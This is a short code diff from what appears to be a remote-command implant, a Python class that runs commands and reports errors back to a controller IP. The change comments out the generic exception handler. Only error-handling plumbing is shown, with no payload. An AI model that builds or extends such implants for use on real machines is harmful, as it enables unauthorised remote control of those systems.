@@ -34,8 +34,8 @@ class Implant(Host):
             
         except TimeoutExpired:
             self.send(self.controller_ip, "instruction", b'The command has timed out', option="ERROR")
-        except Exception:
-            self.send(self.controller_ip, "instruction", b'There was an error with the command', option="ERROR")
+        # except Exception:
+        #     self.send(self.controller_ip, "instruction", b'There was an error with the command', option="ERROR")
 
 if __name__ == "__main__":
     print("[ Setting up implant... ]")
